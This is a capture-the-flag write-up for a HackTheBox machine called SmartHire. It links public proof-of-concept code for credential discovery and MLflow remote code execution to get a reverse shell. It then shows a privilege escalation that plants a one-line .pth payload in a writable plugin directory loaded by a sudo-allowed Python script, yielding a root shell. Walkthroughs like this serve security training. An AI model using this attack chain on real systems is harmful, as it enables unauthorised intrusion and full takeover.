# SmartHire: A HackTheBox machine

## Enumeration

- Port 22 and 80 are open
- Port 80 is running smarthire.htb and models.smarthire.htb


## Initial Foothold

- **models.smarthire.htb** is protected by nginx basic authentication. The latest default credentials didn't seem to work.
- By using [this poc](https://github.com/exploitintel/eip-pocs-and-cves/blob/main/CVE-2026-2635/poc/poc.py) I managed to find out the credentials to log in to the portal.
- The MlFlow portal was running version 2.14.1, which is vulnerable to RCE.
- I used [this exploit](https://github.com/jimmexploit/CVE-2024-37054-PoC) to gain a reverse shell.
- This grants us shell as the `svcweb` user and the user flag.

## Privilege Escalation

- On running sudo -l we get this:

```
Matching Defaults entries for svcweb on smarthire:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

- We can read the code of mlflowctl.py, which is as follows:

```python
#!/usr/bin/env python3
"""
MLFLOW-CTL: Operational interface for managing the MLflow service.
Supports a pluggable extension model for environment-specific logic.
For changes or plugin requests, please contact the Platform Team.
"""

from pathlib import Path
import sys
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

# make plugins importable
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def print_usage():
    print("Usage: mlflowctl.py [status|backup-models|restart]")
    sys.exit(1)

def main():
    import mlflow_actions, backup_models

    if len(sys.argv) < 2:
        print_usage()

    action = sys.argv[1]

    if action == "status":
        mlflow_actions.check_status()
    elif action == "backup-models":
        print("[*] Running backup via backup_models plugin...")
        backup_models.run()
    elif action == "restart":
        mlflow_actions.restart()
    else:
        print(f"[!] Unknown action: {action}")
        print_usage()

if __name__ == "__main__": 
    main()
```

- We can observe here that it adds all plugins from the `plugins` folder to sys.path dynamically. 
- The `/opt/tools/mlflow_ctl/plugins` folder, from which the plugins are dynamically loaded, there are 2 folders, `dev/` and `core/`.
- The `core/` folder is not writable so we can't do much there but the `dev/` folder is writable. So we can exploit it to gain root.
- The vulnerable snippet in the mlflow.py file is this:

```python
for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
```

- So the way to exploit this is to add a .pth file to the `dev/` directory because the python interpreter loads .pth files and executes it during startup.
- So within the `dev/` directory we will make a hack.pth file, containing the following contents:

```python
import os; os.system("/bin/bash")
```

- After the file is created and saved run 

```bash
/usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py backup-models
```

- This gives a root shell.


Happy Hacking :)
